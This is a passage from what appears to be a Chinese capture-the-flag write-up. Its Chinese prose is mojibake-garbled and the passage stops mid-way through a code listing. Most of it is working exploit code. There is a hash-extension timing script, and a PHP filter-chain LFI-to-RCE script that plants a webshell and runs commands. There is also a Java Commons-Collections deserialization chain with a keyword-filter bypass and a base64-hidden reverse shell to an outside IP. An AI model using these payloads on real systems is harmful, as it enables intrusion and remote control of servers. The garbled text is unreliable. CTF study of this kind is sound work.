<p>ç»è¿‡æˆ‘æµ‹è¯•å¤§æ¦‚æäº¤æ—¶é—´å’Œå®é™…æ—¶é—´æœ‰ä¸‰ç§’é’Ÿå·¦å³çš„å»¶è¿Ÿ(è®¡ç®—ä¸¤æ¬¡è¯·æ±‚çš„æ—¶é—´å·®)ï¼Œå†™å‡ºpythonè„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">times = <span class="number">1713193105</span> <span class="comment">#å®é™…æäº¤æ—¶é—´-3</span></span><br><span class="line"></span><br><span class="line">md5value = <span class="string">&#x27;375f1c986d1f091a622a7d7fdb1497a8&#x27;</span> <span class="comment">#åˆ©ç”¨hexpandç”Ÿæˆçš„md5å€¼ï¼Œè¿™é‡Œæ˜¯å®é™…æäº¤æ—¶é—´</span></span><br><span class="line"></span><br><span class="line">value = <span class="string">f&#x27;800000000000000000000000005801000000000000&#x27;</span> <span class="comment">#å‚è€ƒä¸Šé¢hexpandç”Ÿæˆçš„ç»“æœï¼Œåˆ æ‰æœ€å20ä½æ•°æ®</span></span><br><span class="line">value2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(value), <span class="number">2</span>):</span><br><span class="line">   value2+= <span class="string">&quot;%&quot;</span>+value[i]+value[i+<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(value2) <span class="comment">#ç”Ÿæˆurlencode payload</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">f&quot;http://localhost:38864/?md5=<span class="subst">&#123;md5value&#125;</span>&amp;value=<span class="subst">&#123;value2&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Time left &quot;</span> +<span class="built_in">str</span>(time.time() - times))</span><br><span class="line">    <span class="keyword">if</span> (time.time() - times) &gt; <span class="number">0.01</span> <span class="keyword">and</span> time.time() - times &lt; <span class="number">0.15</span>: <span class="comment">#åˆ¤æ–­ä¸€ä¸ªå¤§è‡´åŒºé—´å³å¯ğŸ¤”</span></span><br><span class="line">        res = requests.get(url = url)</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]Waiting..., time is &quot;</span> + <span class="built_in">str</span>(time.time()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]Checking payload &quot;</span> + url)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br></pre></td></tr></table></figure>
<h1><span id="ezlfi"> ezLFI</span></h1>
<p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include_once</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>filterchainç§’æ€ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#å‚æ•°file</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/xyunser.php&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/flag/resource=/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(final_payload)</span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="comment">#&quot;action&quot;: &quot;include&quot;,</span></span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1><span id="baby_unserializeèµ›åå¤ç°"> Baby_Unserialize(èµ›åå¤ç°)</span></h1>
<p>è¿™é‡ŒçœŸçš„æµ‹äº†å¾ˆä¹…â€¦</p>
<p>é»‘ç›’javaï¼Œå‡ºç½‘ï¼Œurldnsé“¾èƒ½æ‰“</p>
<img src="/posts/52072/4.png" class title="awa">
<p>æƒ³ç”¨ccé“¾ï¼Œä½†æ˜¯æ ¹æœ¬æ‰“ä¸å¾—ä¸€ç‚¹ï¼Œç›´æ¥è¿”å›<code>HOW DARE YOU</code></p>
<p>è¿™å°±éš¾åŠäº†ï¼Œä¹Ÿä¸çŸ¥é“åå°æœ‰å•¥gadgetï¼Œåªèƒ½ç›²æµ‹ä¸€æ³¢ã€‚è¿™é‡Œæƒ³åˆ°äº†[ç”¨urldnsé“¾æ¢æµ‹gadget][<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA</a>]</p>
<p>ğŸ¤”ï¼Œæ”¹ä¸€ä¸‹æµ‹gadgetï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException å¯è¡Œ</span><br><span class="line">cbé“¾ æ²¡æœ‰</span><br><span class="line">jackson æ²¡æœ‰</span><br><span class="line">fastjson æ²¡æœ‰</span><br><span class="line">c3p0 æ²¡æœ‰</span><br><span class="line">rome æ²¡æœ‰</span><br><span class="line">hessian æ²¡æœ‰</span><br><span class="line"></span><br><span class="line">ä¸€äº›å¸¸ç”¨çš„gadget</span><br><span class="line">HotSwappable</span><br><span class="line">XStringä¹Ÿæ²¡æœ‰</span><br><span class="line">ç”šè‡³è¿templatesImplä¹Ÿæ²¡æœ‰</span><br></pre></td></tr></table></figure>
<p>ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<img src="/posts/52072/86f1b682121bdb3da34df8760677e1e.png" class title="awa">
<img src="/posts/52072/5.png" class title="awa">
<img src="/posts/52072/6.png" class title="awa">
<p>è¿˜æœ‰å¾ˆå¤šï¼Œå°±ä¸æ”¾å‡ºæ¥äº†</p>
<p>é€†å¤©ï¼Œå•¥gadgetéƒ½æ²¡</p>
<p>è¿™é‡Œå°±åœ¨æƒ³å®ƒåˆ°åº•æ˜¯æ€ä¹ˆè¿‡æ»¤çš„äº†ã€‚</p>
<p>æµ‹å¾—å…³é”®å­—<code>commons.collections</code>è¢«å¹²æ‰äº†ï¼ŒğŸ¤”</p>
<p>è¿™é‡Œè¿˜åœ¨æƒ³ä»–æ˜¯ä¸æ˜¯ç”¨serialkilleræˆ–è€…æ˜¯å…¶ä»–çš„æ–¹å¼ï¼Œæ¯”å¦‚å¸¸è§çš„<code>resolveClass</code>ç»™banæ‰äº†ï¼Œç„¶åç”¨ä¸€ç§å¾ˆæ–°çš„dayç»™ç»•è¿‡</p>
<p>ç™¾æ€ä¸å¾—å…¶è§£ï¼Œåªèƒ½å»æ‰¾æ‰¾ç»•wafçš„æ–¹å¼</p>
<p>æ‰¾æ˜¯æ‰¾åˆ°äº†ï¼Œå›å¿†é£˜å¦‚é›ªå¸ˆå‚…çš„ä¸¤ä¸ªæ–¹å¼ï¼š</p>
<ul>
<li>åŠ å¤§é‡è„æ•°æ®</li>
<li><a target="_blank" rel="noopener" href="https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/">å»¶æ—¶åˆ†å—ä¼ è¾“</a></li>
</ul>
<p>éƒ½æ²¡è§£ï¼Œè¿™ä¹ˆä¸ºéš¾æˆ‘ä¸€ä¸ªå°èŒæ–°å¹²å•¥æã€‚ã€‚</p>
<p>é‚æ”¾å¼ƒã€‚</p>
<p>ä½†å…¶å®æ˜¯è‡ªå·±æƒ³å¤ªå¤šäº†ã€‚ã€‚</p>
<p>è¿˜æœ‰ä¸€ç§å¯èƒ½å°±æ˜¯åªæ£€æµ‹äº†è§£ç åçš„Stringæ˜¯å¦å«æœ‰<code>commons.collections</code>ï¼Œæ¯•ç«Ÿå¦‚æœç›´æ¥é‡å†™<code>resolveClass</code>å°±æ˜¯æ— è§£çš„å‘½é¢˜</p>
<p>åªéœ€è¦ç»•<code>commons.collections</code>å³å¯ï¼š</p>
<p>cc6ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Err0r233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.Utils;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41Mi45NC4yMy8yMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*ByteArrayOutputStream baos = new ByteArrayOutputStream();</span></span><br><span class="line"><span class="comment">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        objectOutputStream.writeObject(hashMap);</span></span><br><span class="line"><span class="comment">        System.out.println(new String(baos.toByteArray()));*/</span></span><br><span class="line"></span><br><span class="line">        <span class="type">UTF8_overlong_encode</span> <span class="variable">encode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UTF8_overlong_encode</span>(baos0);</span><br><span class="line">        encode.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(baos0.toByteArray()));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//System.out.println(Serialize(hashMap));</span></span><br><span class="line">        <span class="comment">//String ser = Serialize(hashMap);</span></span><br><span class="line">        <span class="comment">//UnSerialize(ser);</span></span><br><span class="line">        <span class="comment">//UnSerialize(ser);</span></span><br><span class="line">        <span class="comment">/*ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(baos0.toByteArray()));</span></span><br><span class="line"><span class="comment">        objectInputStream.readObject();</span></span><br><span class="line"><span class="comment">        objectInputStream.close();*/</span></span><br><span class="line">        System.out.println(Utils.Base64_Encode(baos0.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å·¥å…·ç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span 